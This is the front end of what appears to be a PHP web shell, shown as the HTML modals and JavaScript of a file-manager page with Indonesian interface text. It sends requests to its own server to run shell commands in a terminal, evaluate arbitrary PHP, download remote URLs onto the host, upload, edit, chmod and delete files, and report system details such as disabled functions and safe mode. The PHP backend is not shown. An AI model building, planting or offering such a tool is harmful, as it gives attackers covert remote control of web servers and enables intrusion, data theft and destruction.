<!-- SYSINFO MODAL -->
<div class="modal" id="sysinfoModal" onclick="if(event.target===this)this.classList.remove('show')">
    <div class="modal-content" style="max-width:700px;max-height:80vh;overflow-y:auto">
        <h3><i class="fas fa-microchip"></i> System Information</h3>
        <div id="sysinfoContent"></div>
        <div class="modal-btns"><button class="modal-btn-cancel" onclick="document.getElementById('sysinfoModal').classList.remove('show')">CLOSE</button></div>
    </div>
</div>

<!-- EVAL MODAL -->
<div class="modal" id="evalModal" onclick="if(event.target===this)this.classList.remove('show')">
    <div class="modal-content" style="max-width:650px">
        <h3><i class="fab fa-php"></i> PHP Eval</h3>
        <textarea id="evalCode" rows="8" style="border-radius:16px;margin:10px 0;font-family:monospace;font-size:12px;resize:vertical" placeholder="echo 'Hello World!';"></textarea>
        <div id="evalOutput" style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,215,0,0.3);border-radius:16px;padding:12px;font-family:monospace;font-size:11px;color:#ccffaa;max-height:150px;overflow-y:auto;white-space:pre-wrap;margin-bottom:10px;min-height:36px"></div>
        <div class="modal-btns">
            <button class="modal-btn-cancel" onclick="document.getElementById('evalCode').value='';document.getElementById('evalOutput').innerHTML=''">CLEAR</button>
            <button class="modal-btn-primary" onclick="doEval()"><i class="fas fa-play"></i> EXECUTE</button>
        </div>
    </div>
</div>

<input type="file" id="uploadHidden" class="file-input-hidden">

<script>
var currentDir = '<?= addslashes($current_dir) ?>';
var termCwd = currentDir;

function escH(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
function escA(s){return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'")}
function fmtSize(b){if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';if(b>=1048576)return(b/1048576).toFixed(2)+' MB';if(b>=1024)return(b/1024).toFixed(2)+' KB';return b+' B'}

function showMsg(text,type){
    var el=document.getElementById('msgArea');
    el.textContent=text;
    el.style.display='block';
    el.style.borderLeftColor=type==='error'?'#ff6666':'#ffcc00';
    el.style.color=type==='error'?'#ffaaaa':'#fff0cc';
    el.style.background=type==='error'?'rgba(220,60,60,0.2)':'rgba(255,204,0,0.2)';
    clearTimeout(el._timer);
    el._timer=setTimeout(function(){el.style.opacity='0';setTimeout(function(){el.style.display='none';el.style.opacity='1'},500)},4000);
}

function buildBreadcrumbs(path){
    if(path==='/')return 'CURRENT PATH: <a href="#" onclick="navigateDir(\'/\');return false">/</a>';
    var parts=path.split('/').filter(function(p){return p});
    var html='CURRENT PATH: <a href="#" onclick="navigateDir(\'/\');return false">/</a>';
    var acc='';
    for(var i=0;i<parts.length;i++){
        acc+='/'+parts[i];
        html+=' / <a href="#" onclick="navigateDir(\''+escA(acc)+'\');return false">'+escH(parts[i])+'</a>';
    }
    return html;
}

function updatePathBar(){document.getElementById('pathBar').innerHTML=buildBreadcrumbs(currentDir)}

// ==================== FILE LIST ====================
function loadDir(dir){
    currentDir=dir;termCwd=dir;updatePathBar();closeEditor();
    document.getElementById('fileBody').innerHTML='<tr><td colspan="6" style="text-align:center;padding:40px;color:rgba(255,255,255,0.4)"><i class="fas fa-spinner fa-spin" style="font-size:20px"></i></td></tr>';
    var fd=new FormData();fd.append('ajax_action','list_dir');fd.append('dir',dir);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.error){showMsg(d.error,'error');document.getElementById('fileBody').innerHTML='';return}
        renderTable(d.items);
    }).catch(function(e){showMsg('Error: '+e.message,'error');document.getElementById('fileBody').innerHTML=''});
}

function renderTable(items){
    var tb=document.getElementById('fileBody');
    if(!items.length){tb.innerHTML='<tr><td colspan="6" style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">Empty directory</td></tr>';return}
    var html='';
    for(var i=0;i<items.length;i++){
        var it=items[i];
        var isZip=it.name.match(/\.(zip|tar|gz|rar|7z)$/i);
        var nameHtml=it.is_dir
            ?'<a class="folder-link" onclick="navigateDir(\''+escA(it.path)+'\')"><i class="fas fa-folder" style="margin-right:8px;opacity:0.7"></i>'+escH(it.name)+'</a>'
            :'<a class="file-link" onclick="openEditor(\''+escA(it.path)+'\')"><i class="fas fa-file" style="margin-right:8px;opacity:0.5"></i>'+escH(it.name)+'</a>';

        var actions='';
        if(!it.is_dir){
            actions+='<a class="action-btn open" onclick="window.open(\''+escA(it.path).replace(/\\/g,'\\\\')+'\',\'_blank\')">OPEN</a>';
            actions+='<a class="action-btn edit" onclick="openEditor(\''+escA(it.path)+'\')">EDIT</a>';
            if(isZip)actions+='<a class="action-btn extract" onclick="document.getElementById(\'unzipPath\').value=\''+escA(it.path)+'\';doUnzip()">EXTRACT</a>';
        }
        actions+='<a class="action-btn edit" onclick="showRenameModal(\''+escA(it.name)+'\')">RENAME</a>';
        actions+='<a class="action-btn edit" onclick="showChmodModal(\''+escA(it.path)+'\',\''+it.perms+'\')">CHMOD</a>';
        actions+='<a class="action-btn delete" onclick="confirmDel(\''+escA(it.path)+'\',\''+escA(it.name)+'\','+it.is_dir+')">DEL</a>';

        html+='<tr><td><input type="checkbox" class="file-cb" value="'+escH(it.path)+'" onchange="updateDeleteBtn()"></td><td>'+nameHtml+'</td><td style="color:rgba(255,255,255,0.5)">'+(it.is_dir?'—':fmtSize(it.size))+'</td><td style="color:#ffcc00;font-weight:600">'+it.perms+'</td><td style="color:rgba(255,255,255,0.4)">'+it.mtime+'</td><td>'+actions+'</td></tr>';
    }
    tb.innerHTML=html;
    updateDeleteBtn();
}

function navigateDir(d){loadDir(d)}
function toggleSelectAll(checked){document.querySelectorAll('.file-cb').forEach(function(cb){cb.checked=checked});updateDeleteBtn()}
function updateDeleteBtn(){var c=document.querySelectorAll('.file-cb:checked').length;document.getElementById('deleteSelectedWrap').style.display=c>0?'block':'none'}

// ==================== UPLOAD ====================
function doUpload(){
    var inp=document.getElementById('uploadInput');
    var hidden=document.getElementById('uploadHidden');
    if(!inp.files.length){showMsg('Pilih file dulu','error');return}
    var fd=new FormData();fd.append('ajax_action','upload');fd.append('dir',currentDir);
    for(var i=0;i<inp.files.length;i++)fd.append('upfile[]',inp.files[i]);
    showMsg('Mengupload '+inp.files.length+' file...');
    var xhr=new XMLHttpRequest();xhr.open('POST',location.href,true);
    xhr.onload=function(){try{var d=JSON.parse(xhr.responseText);if(d.success){showMsg('Upload berhasil');loadDir(currentDir)}else showMsg(d.error||'Gagal','error')}catch(e){showMsg('Error','error')}};
    xhr.send(fd);inp.value='';
}

// ==================== UNZIP ====================
function doUnzip(){
    var p=document.getElementById('unzipPath').value.trim();
    if(!p){showMsg('Masukkan path ZIP','error');return}
    showMsg('Mengextract...');
    var fd=new FormData();fd.append('ajax_action','unzip');fd.append('zip',p);fd.append('dest',currentDir);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.success){showMsg('Extract berhasil');loadDir(currentDir)}else showMsg(d.output||'Gagal extract','error');
    }).catch(function(e){showMsg('Error','error')});
    document.getElementById('unzipPath').value='';
}

// ==================== TERMINAL ====================
function runCommand(){
    var cmd=document.getElementById('termCmd').value.trim();
    if(!cmd)return;
    var out=document.getElementById('termOutput');
    out.innerHTML+='<div class="term-cmd-line">$ <span class="term-cmd-text">'+escH(cmd)+'</span></div>';
    if(cmd==='clear'){out.innerHTML='Ready for commands...\n';document.getElementById('termCmd').value='';return}
    document.getElementById('termCmd').value='';
    var fd=new FormData();fd.append('ajax_action','terminal');fd.append('cmd',cmd);fd.append('cwd',termCwd);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        out.innerHTML+='<div class="term-result">'+escH(d.output||'(no output)')+'</div>\n';
        out.scrollTop=out.scrollHeight;
    }).catch(function(e){out.innerHTML+='<div class="term-error">Error: '+escH(e.message)+'</div>\n';out.scrollTop=out.scrollHeight});
}
function clearTermOutput(){document.getElementById('termOutput').innerHTML='Ready for commands...\n'}

// ==================== CREATE ====================
function doCreate(){
    var name=document.getElementById('createName').value.trim();
    var type=document.getElementById('createType').value;
    var content=document.getElementById('createContent').value;
    if(!name){showMsg('Masukkan nama','error');return}
    var fd=new FormData();fd.append('ajax_action',type==='folder'?'mkdir':'touch');fd.append('dir',currentDir);fd.append('name',name);
    var doAfter=function(d){
        if(d.success){
            if(type==='file'&&content){
                var fp=currentDir==='/'?'/'+name:currentDir+'/'+name;
                var fd2=new FormData();fd2.append('ajax_action','save_file');fd2.append('file',fp);fd2.append('content',content);
                return fetch(location.href,{method:'POST',body:fd2}).then(function(r){return r.json()});
            }
            return Promise.resolve({success:true});
        }
        return Promise.resolve(d);
    };
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(doAfter).then(function(d){
        if(d.success){showMsg('Berhasil dibuat: '+name);loadDir(currentDir)}
        else showMsg('Gagal membuat','error');
    }).catch(function(e){showMsg('Error','error')});
    document.getElementById('createName').value='';document.getElementById('createContent').value='';
}

// ==================== REMOTE DL ====================
function doRemote(){
    var url=document.getElementById('remoteUrl').value.trim();
    var name=document.getElementById('remoteName').value.trim();
    if(!url){showMsg('Masukkan URL','error');return}
    if(!name){var parts=url.split('/');name=parts[parts.length-1]||'download'}
    var dest=currentDir==='/'?'/'+name:currentDir+'/'+name;
    showMsg('Downloading '+name+'...');
    var fd=new FormData();fd.append('ajax_action','remote_download');fd.append('url',url);fd.append('dest',dest);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.success){showMsg('Download berhasil: '+name);loadDir(currentDir)}else showMsg(d.error||'Gagal','error');
    }).catch(function(e){showMsg('Error','error')});
    document.getElementById('remoteUrl').value='';document.getElementById('remoteName').value='';
}

// ==================== EDITOR ====================
function openEditor(path){
    showMsg('Loading file...');
    var fd=new FormData();fd.append('ajax_action','read_file');fd.append('file',path);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.error){showMsg(d.error,'error');return}
        document.getElementById('editorPath').value=d.path;
        document.getElementById('editorContent').value=d.content;
        document.getElementById('editorSection').classList.add('show');
        document.getElementById('editorSection').scrollIntoView({behavior:'smooth'});
        showMsg('File loaded: '+d.path);
    }).catch(function(e){showMsg('Error','error')});
}
function saveEditor(){
    var path=document.getElementById('editorPath').value.trim();
    var content=document.getElementById('editorContent').value;
    if(!path){showMsg('Path kosong','error');return}
    showMsg('Saving...');
    var fd=new FormData();fd.append('ajax_action','save_file');fd.append('file',path);fd.append('content',content);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.success)showMsg('File disimpan');else showMsg('Gagal simpan','error');
    }).catch(function(e){showMsg('Error','error')});
}
function closeEditor(){document.getElementById('editorSection').classList.remove('show')}
document.getElementById('editorContent').addEventListener('keydown',function(e){if(e.key==='Tab'){e.preventDefault();var s=this.selectionStart,en=this.selectionEnd;this.value=this.value.substring(0,s)+'    '+this.value.substring(en);this.selectionStart=this.selectionEnd=s+4}});

// ==================== RENAME ====================
function showRenameModal(name){
    document.getElementById('renameOld').value=name;
    document.getElementById('renameNew').value=name;
    document.getElementById('renameModal').classList.add('show');
    setTimeout(function(){var inp=document.getElementById('renameNew');inp.focus();var dot=inp.value.lastIndexOf('.');if(dot>0)inp.setSelectionRange(0,dot)},100);
}
function doRename(){
    var oldName=document.getElementById('renameOld').value;
    var newName=document.getElementById('renameNew').value.trim();
    if(!newName||newName===oldName){document.getElementById('renameModal').classList.remove('show');return}
    var oldPath=currentDir==='/'?'/'+oldName:currentDir+'/'+oldName;
    var newPath=currentDir==='/'?'/'+newName:currentDir+'/'+newName;
    var fd=new FormData();fd.append('ajax_action','rename');fd.append('old',oldPath);fd.append('new',newPath);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        document.getElementById('renameModal').classList.remove('show');
        if(d.success){showMsg('Renamed: '+newName);loadDir(currentDir)}else showMsg('Gagal rename','error');
    }).catch(function(e){document.getElementById('renameModal').classList.remove('show');showMsg('Error','error')});
}

// ==================== CHMOD ====================
function showChmodModal(path,perms){
    document.getElementById('chmodTarget').value=path;
    document.getElementById('chmodValue').value=perms;
    document.getElementById('chmodModal').classList.add('show');
    setTimeout(function(){document.getElementById('chmodValue').select()},100);
}
function doChmod(){
    var target=document.getElementById('chmodTarget').value;
    var mode=document.getElementById('chmodValue').value.trim();
    if(!mode){document.getElementById('chmodModal').classList.remove('show');return}
    var fd=new FormData();fd.append('ajax_action','chmod');fd.append('target',target);fd.append('mode',mode);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        document.getElementById('chmodModal').classList.remove('show');
        if(d.success){showMsg('Permission: '+mode);loadDir(currentDir)}else showMsg('Gagal chmod','error');
    }).catch(function(e){document.getElementById('chmodModal').classList.remove('show');showMsg('Error','error')});
}

// ==================== DELETE ====================
function confirmDel(path,name,isDir){
    if(!confirm('DELETE '+(isDir?'FOLDER':'FILE')+'?\n\n'+name))return;
    var fd=new FormData();fd.append('ajax_action','delete');fd.append('target',path);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.success){showMsg('Dihapus: '+name);loadDir(currentDir)}else showMsg('Gagal hapus','error');
    }).catch(function(e){showMsg('Error','error')});
}
function deleteSelected(){
    var items=[];document.querySelectorAll('.file-cb:checked').forEach(function(cb){items.push(cb.value)});
    if(!items.length)return;
    if(!confirm('DELETE '+items.length+' ITEMS?'))return;
    var fd=new FormData();fd.append('ajax_action','delete_multi');
    for(var i=0;i<items.length;i++)fd.append('targets[]',items[i]);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        if(d.success){showMsg(items.length+' item dihapus');loadDir(currentDir)}else showMsg('Gagal','error');
    }).catch(function(e){showMsg('Error','error')});
}

// ==================== SYSINFO ====================
function showSysInfo(){
    document.getElementById('sysinfoContent').innerHTML='<div style="text-align:center;padding:30px;color:rgba(255,255,255,0.4)"><i class="fas fa-spinner fa-spin" style="font-size:20px"></i></div>';
    document.getElementById('sysinfoModal').classList.add('show');
    var fd=new FormData();fd.append('ajax_action','sysinfo');
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){
        function row(l,v,c){c=c||'#f0f0f0';return'<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,215,0,0.1);font-size:12px"><span style="color:rgba(255,255,255,0.5)">'+l+'</span><span style="color:'+c+';font-family:monospace;font-size:11px;text-align:right;max-width:60%;word-break:break-all">'+escH(v)+'</span></div>'}
        document.getElementById('sysinfoContent').innerHTML=
            '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">System</div>'+row('OS',d.os)+row('Hostname',d.hostname)+row('User',d.user)+row('Server IP',d.server_ip)+row('Client IP',d.client_ip)+row('Web Server',d.server_sw)+'</div>'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">PHP</div>'+row('Version',d.php_ver)+row('Safe Mode',d.safe_mode,d.safe_mode==='ON'?'#ff6666':'#88ff88')+row('Open Basedir',d.open_basedir)+row('Upload Max',d.upload_max)+row('Memory',d.memory_limit)+row('Max Exec',d.max_exec)+'</div>'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">Disk</div>'+row('Total',d.disk_total)+row('Used',d.disk_used)+row('Free',d.disk_free)+row('Usage',d.disk_pct+'%')+'<div style="width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:3px;margin-top:10px;overflow:hidden"><div style="height:100%;width:'+d.disk_pct+'%;background:linear-gradient(90deg,#ffcc00,#ff4444);border-radius:3px"></div></div></div>'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">Paths</div>'+row('Doc Root',d.doc_root)+row('Script',d.script_path)+row('CWD',d.cwd)+'</div>'+
            '</div>'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px;margin-top:12px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Disabled Functions</div><div style="font-family:monospace;font-size:11px;color:'+(d.disabled==='None'?'#88ff88':'#ff6666')+';word-break:break-all">'+escH(d.disabled)+'</div></div>'+
            '<div style="background:rgba(0,0,0,0.2);border-radius:16px;padding:14px;margin-top:12px"><div style="color:#ffcc00;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Extensions ('+d.extensions.length+')</div><div style="display:flex;flex-wrap:wrap;gap:4px">'+d.extensions.map(function(e){return'<span style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,215,0,0.2);padding:2px 8px;border-radius:20px;font-size:10px;font-family:monospace;color:rgba(255,255,255,0.6)">'+escH(e)+'</span>'}).join('')+'</div></div>';
    }).catch(function(e){document.getElementById('sysinfoContent').innerHTML='<p style="color:#ff6666">'+escH(e.message)+'</p>'});
}

// ==================== EVAL ====================
function showEvalModal(){document.getElementById('evalModal').classList.add('show')}
function doEval(){
    var code=document.getElementById('evalCode').value;
    var out=document.getElementById('evalOutput');
    out.innerHTML='<span style="color:rgba(255,255,255,0.4)">Executing...</span>';
    var fd=new FormData();fd.append('ajax_action','eval_php');fd.append('code',code);
    fetch(location.href,{method:'POST',body:fd}).then(function(r){return r.json()}).then(function(d){out.innerHTML=escH(d.output||'(no output)')}).catch(function(e){out.innerHTML='<span style="color:#ff8888">'+escH(e.message)+'</span>'});
}

// ==================== KEYBOARD ====================
document.addEventListener('keydown',function(e){
    if(e.key==='Escape'){
        document.querySelectorAll('.modal.show').forEach(function(m){m.classList.remove('show')});
        closeEditor();
    }
});

// ==================== INIT ====================
updatePathBar();
loadDir(currentDir);
</script>
</body>
</html>
